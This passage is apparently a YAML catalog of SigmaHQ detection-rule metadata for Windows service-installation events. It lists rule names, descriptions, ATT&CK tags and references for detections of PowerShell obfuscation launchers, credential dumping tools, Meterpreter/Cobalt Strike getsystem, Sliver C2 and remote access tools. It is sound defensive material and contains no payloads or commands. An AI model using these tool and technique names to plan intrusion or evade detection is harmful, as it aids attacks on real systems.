  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.001
  tags:
  - attack.defense-evasion
  - attack.t1027
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/SigmaHQ/sigma/issues/1009
  false_positives:
  - Unknown
  notes: ''
- detection_id: 51aa9387-1c53-4153-91cc-d73c59ae1ca9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/system/service_control_manager/win_system_invoke_obfuscation_obfuscated_iex_services.yml
  name: Invoke-Obfuscation Obfuscated IEX Invocation - System
  description: Detects all variations of obfuscated powershell IEX invocation code
    generated by Invoke-Obfuscation framework from the code block linked in the references
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1027
  tags:
  - attack.defense-evasion
  - attack.t1027
  time_window: ''
  references:
  - https://github.com/danielbohannon/Invoke-Obfuscation/blob/f20e7f843edd0a3a7716736e9eddfa423395dd26/Out-ObfuscatedStringCommand.ps1#L873-L888
  false_positives:
  - Unknown
  notes: ''
- detection_id: 72862bf2-0eb1-11eb-adc1-0242ac120002
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/system/service_control_manager/win_system_invoke_obfuscation_stdin_services.yml
  name: Invoke-Obfuscation STDIN+ Launcher - System
  description: Detects Obfuscated use of stdin to execute PowerShell
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.001
  tags:
  - attack.defense-evasion
  - attack.t1027
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/SigmaHQ/sigma/issues/1009
  false_positives:
  - Unknown
  notes: ''
- detection_id: 8ca7004b-e620-4ecb-870e-86129b5b8e75
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/system/service_control_manager/win_system_invoke_obfuscation_var_services.yml
  name: Invoke-Obfuscation VAR+ Launcher - System
  description: Detects Obfuscated use of Environment Variables to execute PowerShell
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.001
  tags:
  - attack.defense-evasion
  - attack.t1027
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/SigmaHQ/sigma/issues/1009
  false_positives:
  - Unknown
  notes: ''
- detection_id: 175997c5-803c-4b08-8bb0-70b099f47595
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/system/service_control_manager/win_system_invoke_obfuscation_via_compress_services.yml
  name: Invoke-Obfuscation COMPRESS OBFUSCATION - System
  description: Detects Obfuscated Powershell via COMPRESS OBFUSCATION
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.001
  tags:
  - attack.defense-evasion
  - attack.t1027
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/SigmaHQ/sigma/issues/1009
  false_positives:
  - Unknown
  notes: ''
- detection_id: 11b52f18-aaec-4d60-9143-5dd8cc4706b9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/system/service_control_manager/win_system_invoke_obfuscation_via_rundll_services.yml
  name: Invoke-Obfuscation RUNDLL LAUNCHER - System
  description: Detects Obfuscated Powershell via RUNDLL LAUNCHER
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.001
  tags:
  - attack.defense-evasion
  - attack.t1027
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/SigmaHQ/sigma/issues/1009
  false_positives:
  - Unknown
  notes: ''
- detection_id: 487c7524-f892-4054-b263-8a0ace63fc25
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/system/service_control_manager/win_system_invoke_obfuscation_via_stdin_services.yml
  name: Invoke-Obfuscation Via Stdin - System
  description: Detects Obfuscated Powershell via Stdin in Scripts
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.001
  tags:
  - attack.defense-evasion
  - attack.t1027
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/SigmaHQ/sigma/issues/1009
  false_positives:
  - Unknown
  notes: ''
- detection_id: 63e3365d-4824-42d8-8b82-e56810fefa0c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/system/service_control_manager/win_system_invoke_obfuscation_via_use_clip_services.yml
  name: Invoke-Obfuscation Via Use Clip - System
  description: Detects Obfuscated Powershell via use Clip.exe in Scripts
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.001
  tags:
  - attack.defense-evasion
  - attack.t1027
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/SigmaHQ/sigma/issues/1009
  false_positives:
  - Unknown
  notes: ''
- detection_id: 7e9c7999-0f9b-4d4a-a6ed-af6d553d4af4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/system/service_control_manager/win_system_invoke_obfuscation_via_use_mshta_services.yml
  name: Invoke-Obfuscation Via Use MSHTA - System
  description: Detects Obfuscated Powershell via use MSHTA in Scripts
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.001
  tags:
  - attack.defense-evasion
  - attack.t1027
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/SigmaHQ/sigma/issues/1009
  false_positives:
  - Unknown
  notes: ''
- detection_id: 641a4bfb-c017-44f7-800c-2aee0184ce9b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/system/service_control_manager/win_system_invoke_obfuscation_via_use_rundll32_services.yml
  name: Invoke-Obfuscation Via Use Rundll32 - System
  description: Detects Obfuscated Powershell via use Rundll32 in Scripts
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.001
  tags:
  - attack.defense-evasion
  - attack.t1027
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/SigmaHQ/sigma/issues/1009
  false_positives:
  - Unknown
  notes: ''
- detection_id: 14bcba49-a428-42d9-b943-e2ce0f0f7ae6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/system/service_control_manager/win_system_invoke_obfuscation_via_var_services.yml
  name: Invoke-Obfuscation VAR++ LAUNCHER OBFUSCATION - System
  description: Detects Obfuscated Powershell via VAR++ LAUNCHER
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1027
  - T1059.001
  tags:
  - attack.defense-evasion
  - attack.t1027
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://github.com/SigmaHQ/sigma/issues/1009
  false_positives:
  - Unknown
  notes: ''
- detection_id: e97d9903-53b2-41fc-8cb9-889ed4093e80
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/system/service_control_manager/win_system_krbrelayup_service_installation.yml
  name: KrbRelayUp Service Installation
  description: Detects service creation from KrbRelayUp tool used for privilege escalation
    in Windows domain environments where LDAP signing is not enforced (the default
    settings)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  - guardrail:ioc_only_cap
  severity: high
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1543
  tags:
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1543
  time_window: ''
  references:
  - https://github.com/Dec0ne/KrbRelayUp
  false_positives:
  - Unknown
  notes: ''
- detection_id: 4976aa50-8f41-45c6-8b15-ab3fc10e79ed
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/system/service_control_manager/win_system_mal_creddumper.yml
  name: Credential Dumping Tools Service Execution - System
  description: Detects well-known credential dumping tools execution via service execution
    events
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1003.001
  - T1003.002
  - T1003.004
  - T1003.005
  - T1003.006
  - T1569.002
  tags:
  - attack.credential-access
  - attack.execution
  - attack.t1003.001
  - attack.t1003.002
  - attack.t1003.004
  - attack.t1003.005
  - attack.t1003.006
  - attack.t1569.002
  - attack.s0005
  time_window: ''
  references:
  - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment
  false_positives:
  - Legitimate Administrator using credential dumping tool for password recovery
  notes: ''
- detection_id: 843544a7-56e0-4dcc-a44f-5cc266dd97d6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/system/service_control_manager/win_system_meterpreter_or_cobaltstrike_getsystem_service_installation.yml
  name: Meterpreter or Cobalt Strike Getsystem Service Installation - System
  description: Detects the use of getsystem Meterpreter/Cobalt Strike command by detecting
    a specific service installation
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1134.001
  - T1134.002
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1134.001
  - attack.t1134.002
  time_window: ''
  references:
  - https://speakerdeck.com/heirhabarov/hunting-for-privilege-escalation-in-windows-environment
  - https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 25b9c01c-350d-4b95-bed1-836d04a4f324
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/system/service_control_manager/win_system_moriya_rootkit.yml
  name: Moriya Rootkit - System
  description: Detects the use of Moriya rootkit as described in the securelist's
    Operation TunnelSnake report
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1543.003
  tags:
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1543.003
  time_window: ''
  references:
  - https://securelist.com/operation-tunnelsnake-and-moriya-rootkit/101831
  false_positives:
  - Unknown
  notes: ''
- detection_id: a2e5019d-a658-4c6a-92bf-7197b54e2cae
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/system/service_control_manager/win_system_powershell_script_installed_as_service.yml
  name: PowerShell Scripts Installed as Services
  description: Detects powershell script installed as a Service
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1569.002
  tags:
  - attack.execution
  - attack.t1569.002
  time_window: ''
  references:
  - https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse
  false_positives:
  - Unknown
  notes: ''
- detection_id: 530a6faa-ff3d-4022-b315-50828e77eef5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/system/service_control_manager/win_system_service_install_anydesk.yml
  name: Anydesk Remote Access Software Service Installation
  description: Detects the installation of the anydesk software service. Which could
    be an indication of anydesk abuse if you the software isn't already used.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.persistence
  time_window: ''
  references:
  - https://thedfirreport.com/2022/08/08/bumblebee-roasts-its-way-to-domain-admin/
  - https://thedfirreport.com/2025/02/24/confluence-exploit-leads-to-lockbit-ransomware/
  false_positives:
  - Legitimate usage of the anydesk tool
  notes: ''
- detection_id: a27e5fa9-c35e-4e3d-b7e0-1ce2af66ad12
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/system/service_control_manager/win_system_service_install_csexecsvc.yml
  name: CSExec Service Installation
  description: Detects CSExec service installation and execution events
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1569.002
  tags:
  - attack.execution
  - attack.t1569.002
  time_window: ''
  references:
  - https://github.com/malcomvetter/CSExec
  false_positives:
  - Unknown
  notes: ''
- detection_id: d26ce60c-2151-403c-9a42-49420d87b5e4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/system/service_control_manager/win_system_service_install_hacktools.yml
  name: HackTool Service Registration or Execution
  description: Detects installation or execution of services
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1569.002
  tags:
  - attack.execution
  - attack.t1569.002
  - attack.s0029
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Unknown
  notes: ''
- detection_id: e0d1ad53-c7eb-48ec-a87a-72393cc6cedc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/system/service_control_manager/win_system_service_install_mesh_agent.yml
  name: Mesh Agent Service Installation
  description: Detects a Mesh Agent service installation. Mesh Agent is used to remotely
    manage computers
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1219.002
  tags:
  - attack.command-and-control
  - attack.t1219.002
  time_window: ''
  references:
  - https://thedfirreport.com/2022/11/28/emotet-strikes-again-lnk-file-leads-to-domain-wide-ransomware/
  false_positives:
  - Legitimate use of the tool
  notes: ''
- detection_id: 2d510d8d-912b-45c5-b1df-36faa3d8c3f4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/system/service_control_manager/win_system_service_install_netsupport_manager.yml
  name: NetSupport Manager Service Install
  description: Detects NetSupport Manager service installation on the target system.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.persistence
  time_window: ''
  references:
  - http://resources.netsupportsoftware.com/resources/manualpdfs/nsm_manual_uk.pdf
  false_positives:
  - Legitimate use of the tool
  notes: ''
- detection_id: de7ce410-b3fb-4e8a-b38c-3b999e2c3420
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/system/service_control_manager/win_system_service_install_paexec.yml
  name: PAExec Service Installation
  description: Detects PAExec service installation
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1569.002
  tags:
  - attack.execution
  - attack.t1569.002
  time_window: ''
  references:
  - https://www.poweradmin.com/paexec/
  false_positives:
  - Unknown
  notes: ''
- detection_id: ee9ca27c-9bd7-4cee-9b01-6e906be7cae3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/system/service_control_manager/win_system_service_install_pdqdeploy.yml
  name: New PDQDeploy Service - Server Side
  description: 'Detects a PDQDeploy service installation which indicates that PDQDeploy
    was installed on the machines.

    PDQDeploy can be abused by attackers to remotely install packages or execute commands
    on target machines

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1543.003
  tags:
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1543.003
  time_window: ''
  references:
  - https://documentation.pdq.com/PDQDeploy/13.0.3.0/index.html?windows-services.htm
  false_positives:
  - Legitimate use of the tool
  notes: ''
- detection_id: b98a10af-1e1e-44a7-bab2-4cc026917648
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/system/service_control_manager/win_system_service_install_pdqdeploy_runner.yml
  name: New PDQDeploy Service - Client Side
  description: 'Detects PDQDeploy service installation on the target system.

    When a package is deployed via PDQDeploy it installs a remote service on the target
    machine with the name "PDQDeployRunner-X" where "X" is an integer starting from
    1

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1543.003
  tags:
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1543.003
  time_window: ''
  references:
  - https://documentation.pdq.com/PDQDeploy/13.0.3.0/index.html?windows-services.htm
  false_positives:
  - Legitimate use of the tool
  notes: ''
- detection_id: c4ff1eac-84ad-44dd-a6fb-d56a92fc43a9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/system/service_control_manager/win_system_service_install_pua_proceshacker.yml
  name: ProcessHacker Privilege Elevation
  description: Detects a ProcessHacker tool that elevated privileges to a very high
    level
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1543.003
  - T1569.002
  tags:
  - attack.persistence
  - attack.execution
  - attack.privilege-escalation
  - attack.t1543.003
  - attack.t1569.002
  time_window: ''
  references:
  - https://twitter.com/1kwpeter/status/1397816101455765504
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 9e36ed87-4986-482e-8e3b-5c23ffff11bf
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/system/service_control_manager/win_system_service_install_remcom.yml
  name: RemCom Service Installation
  description: Detects RemCom service installation and execution events
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1569.002
  tags:
  - attack.execution
  - attack.t1569.002
  time_window: ''
  references:
  - https://github.com/kavika13/RemCom/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 1a31b18a-f00c-4061-9900-f735b96c99fc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/system/service_control_manager/win_system_service_install_remote_access_software.yml
  name: Remote Access Tool Services Have Been Installed - System
  description: Detects service installation of different remote access tools software.
    These software are often abused by threat actors to perform
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1543.003
  - T1569.002
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.execution
  - attack.t1543.003
  - attack.t1569.002
  time_window: ''
  references:
  - https://redcanary.com/blog/misbehaving-rats/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 85cce894-dd8b-4427-a958-5cc47a4dc9b9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/system/service_control_manager/win_system_service_install_remote_utilities.yml
  name: Remote Utilities Host Service Install
  description: Detects Remote Utilities Host service installation on the target system.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.persistence
  time_window: ''
  references:
  - https://www.remoteutilities.com/support/kb/host-service-won-t-start/
  false_positives:
  - Legitimate use of the tool
  notes: ''
- detection_id: 31c51af6-e7aa-4da7-84d4-8f32cc580af2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/system/service_control_manager/win_system_service_install_sliver.yml
  name: Sliver C2 Default Service Installation
  description: Detects known malicious service installation that appear in cases in
    which a Sliver implants execute the PsExec commands
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1543.003
  - T1569.002
  tags:
  - attack.persistence
  - attack.execution
  - attack.privilege-escalation
  - attack.t1543.003
  - attack.t1569.002
  time_window: ''
  references:
  - https://github.com/BishopFox/sliver/blob/79f2d48fcdfc2bee4713b78d431ea4b27f733f30/client/command/commands.go#L1231
  - https://www.microsoft.com/security/blog/2022/08/24/looking-for-the-sliver-lining-hunting-for-emerging-command-and-control-frameworks/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 71c276aa-49cd-43d2-b920-2dcd3e6962d5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/system/service_control_manager/win_system_service_install_sups_unusal_client.yml
  name: Service Installed By Unusual Client - System
  description: Detects a service installed by a client which has PID 0 or whose parent
    has PID 0
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1543
  tags:
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1543
  time_window: ''
  references:
  - https://www.elastic.co/guide/en/security/current/windows-service-installed-via-an-unusual-client.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 1d61f71d-59d2-479e-9562-4ff5f4ead16b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/system/service_control_manager/win_system_service_install_susp.yml
  name: Suspicious Service Installation
  description: Detects suspicious service installation commands
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1543.003
  tags:
  - attack.persistence
  - attack.privilege-escalation
  - car.2013-09-005
  - attack.t1543.003
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Unknown
  notes: ''
- detection_id: 42c575ea-e41e-41f1-b248-8093c3e82a28
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/system/service_control_manager/win_system_service_install_sysinternals_psexec.yml
  name: PsExec Service Installation
  description: Detects PsExec service installation and execution events
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1569.002
  tags:
  - attack.execution
  - attack.t1569.002
  - attack.s0029
  time_window: ''
  references:
  - https://www.jpcert.or.jp/english/pub/sr/ir_research.html
  - https://jpcertcc.github.io/ToolAnalysisResultSheet
  false_positives:
  - Unknown
  notes: ''
- detection_id: 4bb79b62-ef12-4861-981d-2aab43fab642
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/system/service_control_manager/win_system_service_install_tacticalrmm.yml
  name: TacticalRMM Service Installation
  description: Detects a TacticalRMM service installation. Tactical RMM is a remote
    monitoring & management tool.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1219.002
  tags:
  - attack.command-and-control
  - attack.t1219.002
  time_window: ''
  references:
  - https://thedfirreport.com/2022/11/28/emotet-strikes-again-lnk-file-leads-to-domain-wide-ransomware/
  false_positives:
  - Legitimate use of the tool
  notes: ''
- detection_id: 8e4cf0e5-aa5d-4dc3-beff-dc26917744a9
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/system/service_control_manager/win_system_service_install_tap_driver.yml
  name: Tap Driver Installation
  description: Well-known TAP software installation. Possible preparation for data
    exfiltration using tunnelling techniques
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics:
  - Exfiltration
  techniques:
  - T1048
  tags:
  - attack.exfiltration
  - attack.t1048
  time_window: ''
  references:
  - https://community.openvpn.net/openvpn/wiki/ManagingWindowsTAPDrivers
  false_positives:
  - Legitimate OpenVPN TAP installation
  notes: ''
- detection_id: 26481afe-db26-4228-b264-25a29fe6efc7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/system/service_control_manager/win_system_service_install_uncommon.yml
  name: Uncommon Service Installation Image Path
  description: 'Detects uncommon service installation commands by looking at suspicious
    or uncommon image path values containing references to encoded powershell commands,
    temporary paths, etc.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1543.003
  tags:
  - attack.persistence
  - attack.privilege-escalation
  - car.2013-09-005
  - attack.t1543.003
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Unknown
  notes: ''
- detection_id: acfa2210-0d71-4eeb-b477-afab494d596c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/system/service_control_manager/win_system_service_terminated_error_generic.yml
  name: Windows Service Terminated With Error
  description: Detects Windows services that got terminated for whatever reason
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://www.microsoft.com/en-us/security/blog/2023/04/11/guidance-for-investigating-attacks-using-cve-2022-21894-the-blacklotus-campaign/
  false_positives:
  - False positives could occur since service termination could happen due to multiple
    reasons
  notes: ''
- detection_id: d6b5520d-3934-48b4-928c-2aa3f92d6963
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/system/service_control_manager/win_system_service_terminated_error_important.yml
  name: Important Windows Service Terminated With Error
  description: Detects important or interesting Windows services that got terminated
    for whatever reason
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://www.microsoft.com/en-us/security/blog/2023/04/11/guidance-for-investigating-attacks-using-cve-2022-21894-the-blacklotus-campaign/
  false_positives:
  - Rare false positives could occur since service termination could happen due to
    multiple reasons
